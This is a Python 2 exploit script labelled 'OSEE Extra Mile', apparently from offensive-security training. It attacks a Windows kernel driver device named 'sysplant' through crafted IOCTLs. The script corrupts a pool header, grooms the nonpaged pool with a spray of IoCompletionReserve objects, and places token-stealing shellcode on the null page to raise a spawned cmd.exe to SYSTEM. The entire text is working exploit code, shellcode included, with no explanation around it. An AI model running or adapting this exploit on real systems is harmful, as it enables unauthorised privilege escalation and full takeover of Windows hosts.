from ctypes import *
from ctypes.wintypes import *
import sys, struct

### Bitmasks ###
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = 0x1fffff
STATUS_INVALID_HANDLE = 0xC0000008
STATUS_SUCCESS = 0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004

### ctypes shorthand ###
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

### WinAPI shorthand ###
CreateFile = windll.kernel32.CreateFileW
DeviceIoControl = windll.kernel32.DeviceIoControl
VirtualAlloc = windll.kernel32.VirtualAlloc
NtAllocateReserveObject = windll.ntdll.NtAllocateReserveObject
CloseHandle = windll.kernel32.CloseHandle
GetCurrentProcessID = windll.kernel32.GetCurrentProcessId
NtQuerySystemInformation = windll.ntdll.NtQuerySystemInformation
NtQueryObject = windll.ntdll.NtQueryObject
NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
GetCurrentProcess = windll.kernel32.GetCurrentProcess
CreateProcess = windll.kernel32.CreateProcessW

class STARTUPINFO(Structure):
    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]

class PROCESSENTRY32(Structure):
    _fields_ = [
        ("dwSize", c_ulong),
        ("cntUsage", c_ulong),
        ("th32ProcessID", c_ulong),
        ("th32DefaultHeapID", c_int),
        ("th32ModuleID", c_ulong),
        ("cntThreads", c_ulong),
        ("th32ParentProcessID", c_ulong),
        ("pcPriClassBase", c_long),
        ("dwFlags", c_ulong),
        ("szExeFile", c_wchar * MAX_PATH)
    ]

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    _fields_ = [
        ("Object", c_void_p),
        ("UniqueProcessId", ULONG),
        ("HandleValue", ULONG),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]

class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    _fields_ = [
        ("NumberOfHandles", ULONG),
        ("Reserved", ULONG),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

class LSA_UNICODE_STRING(Structure):
    _fields_ = [
        ("Length", USHORT),
        ("MaximumLength", USHORT),
        ("Buffer", LPWSTR),
    ]

class PUBLIC_OBJECT_TYPE_INFORMATION(Structure):
    _fields_ = [
        ("Name", LSA_UNICODE_STRING),
        ("Reserved", ULONG * 22),
    ]

def spawnshell():
    print "[*]Spawning shell[*]"
    unicodecmd = u"c:\\windows\\system32\\cmd.exe"
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()

    ret = CreateProcess(unicodecmd, unicodecmd, None, None, 0, CREATE_NEW_CONSOLE, None, None, byref(lpStartupInfo), byref(lpProcessInformation))

    if not ret:
        print "\t[-]Error spawning shell: " + FormatError()
        sys.exit(-1)

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    return lpProcessInformation.dwProcessId

def getdriverhandle():
    print "[*]Getting device handle[*]"
    lpFileName = u"\\\\.\\sysplant"
    dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFile(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)

    if not handle or handle == -1:
        print"\t[-]Error getting device handle: " + FormatError()
        sys.exit(-1)

    print "\t[+]Got device handle: 0x%x" % handle
    return handle

def signed_to_unsigned(signed):
    unsigned, = struct.unpack("L", struct.pack("l", signed))
    return unsigned

def get_type_info (handle):
    public_object_type_information = PUBLIC_OBJECT_TYPE_INFORMATION()
    size = DWORD(sizeof(public_object_type_information))
    while True:
        result = signed_to_unsigned(
            NtQueryObject(handle, 2, byref(public_object_type_information), size, None))
        if result == STATUS_SUCCESS:
            return public_object_type_information.Name.Buffer
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value*4)
            resize(public_object_type_information, size.value)
        elif result == STATUS_INVALID_HANDLE:
            return None

def get_handles():
    system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD(sizeof(system_handle_information))
    while True:
        result = NtQuerySystemInformation(64, byref(system_handle_information), size, byref(size))
        result = signed_to_unsigned(result)
        if result == STATUS_SUCCESS:
            break
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(system_handle_information, size.value)

    pHandles = cast(system_handle_information.Handles, POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * system_handle_information.NumberOfHandles))
    for handle in pHandles.contents:
        yield handle.UniqueProcessId, handle.HandleValue, handle.Object

def heapfengshei(driverhandle):
    print "[*]Starting Heap Feng Shei[*]"
    global handles
    handles = {}
    for i in range(0, 50000):
         hHandle = HANDLE(0)
         NtAllocateReserveObject(byref(hHandle), 0x0, 0x1)
         handles[hHandle.value] = hHandle
    print "\t[+]Spray completed"
    createholes(driverhandle)

def createholes(driverhandle):
    print "\t[+]Creating holes in nonpaged pool"
    global handles
    mypid = GetCurrentProcessID()
    handlehole = {}
    totalhandles = []
    for pid, handle, obj in get_handles():
        if pid == mypid and get_type_info(handle) == "IoCompletionReserve":
            handlehole[obj] = handle
            totalhandles.append(obj)
    holes = []
    for obj in totalhandles:
        alloc = obj-0x30
        if (alloc & 0xfffff000) == alloc:
            try:
                holes.append((
                               handlehole[obj+0x580],handlehole[obj+0x520],
                               handlehole[obj+0x4c0],handlehole[obj+0x460],
                               handlehole[obj+0x400],handlehole[obj+0x3a0],
                               handlehole[obj+0x340],handlehole[obj+0x2e0],
                               handlehole[obj+0x280],handlehole[obj+0x220],
                               handlehole[obj+0x1c0],handlehole[obj+0x160],
                               handlehole[obj+0x100]))
            except KeyError:
                pass
    for hole in holes:
        CloseHandle(handles[hole[1]])
        CloseHandle(handles[hole[2]])
        CloseHandle(handles[hole[3]])
        CloseHandle(handles[hole[4]])
        CloseHandle(handles[hole[5]])
        CloseHandle(handles[hole[6]])
        CloseHandle(handles[hole[7]])
        CloseHandle(handles[hole[8]])
        CloseHandle(handles[hole[9]])
        CloseHandle(handles[hole[10]])
        CloseHandle(handles[hole[11]])
        CloseHandle(handles[hole[12]])
    print "\t[+]Heap Feng Shei complete"

    trigger(driverhandle)
    for hole in holes:
        CloseHandle(handles[hole[0]])
    print "\t[+]Freed crafted chunk"
    print "\t[+]Enjoy system shellz"

def nullalloc(pid):
    print "[*]Setting up shellcode[*]"
    BaseAddress = c_void_p(0x1)
    RegionSize = c_int(1000)
    nullpage = NtAllocateVirtualMemory(GetCurrentProcess(), byref(BaseAddress), 0, byref(RegionSize), (MEM_COMMIT|MEM_RESERVE), PAGE_EXECUTE_READWRITE)
    if nullpage != STATUS_SUCCESS:
        print "\t[-]Error allocating null page: " + FormatError()
        sys.exit(-1)
    print "\t[+]Sucessfully allocated null page"

    tokenstealing = (
        "\x60\x64\x8B\x15\x24\x01\x00\x00\x8B\x42\x50\x50\xBB\x04\x00\x00\x00\x8B\x80"
        "\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x98\xB4\x00\x00\x00\x75\xED\x8B\xB8\xF8"
        "\x00\x00\x00\x83\xE7\xF8\x58\xBB" +struct.pack("<I", pid)+ "\x8B\x80\xB8\x00\x00"
        "\x00\x2D\xB8\x00\x00\x00\x39\x98\xB4\x00\x00\x00\x75\xED\x89\xB8\xF8\x00\x00\x00"
        "\x61\xC2\x10\x00\x90\x90\x90\x90")

    copypointer = create_string_buffer("\x00" * 0x70 + struct.pack("<L", 0x00000078) + tokenstealing)
    memmove(0x4, addressof(copypointer), sizeof(copypointer))
    print "\t[+]Copied shellcode to null page"

def makenewbuffers(hDevice):
    print "[*]Trying to manipulate buffers[*]"
    poolheader =   ("\x00\x00\x00\x00\x90\x00\x0c\x04\x49\x6f\x43\xef\x00\x00\x00\x00\x5c\x00\x00\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00")
    dwIoControlCode = 0x22205c
    lpInBuffer = create_string_buffer("\x41"*0x4 + struct.pack("<L", dwIoControlCode) + "\x42"*0x8 + "\x58\x04\x00\x00" + "\x44"*(0x428) + poolheader)
    nInBufferSize = 0x500
    lpOutBuffer = create_string_buffer("\x45"*100)
    nOutBufferSize = 0x40
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None
    pwnd = DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped)

    if not pwnd:
        print "\t[-]Error: You failed\n" + FormatError()
        sys.exit(-1)
    print "\t[+]Buffers smashed with malicious values"

def trigger(hDevice):
    print "[*]Sending malicious IOCTL[*]"
    dwIoControlCode = 0x222060
    lpInBuffer = create_string_buffer("\x41"*4 + struct.pack("<L", dwIoControlCode) + "\x42"*56)
    nInBufferSize = sizeof(lpInBuffer)
    lpOutBuffer = create_string_buffer("\x00"*1024)
    nOutBufferSize = sizeof(lpOutBuffer)
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None
    pwnd = DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped)

    if not pwnd:
        print "\t[-]Error: You failed\n" + FormatError()
        sys.exit(-1)

if __name__ == "__main__":
    print "\nOSEE Extra Mile\n"
    nullalloc(spawnshell())
    handle = getdriverhandle()
    makenewbuffers(handle)
    heapfengshei(handle)
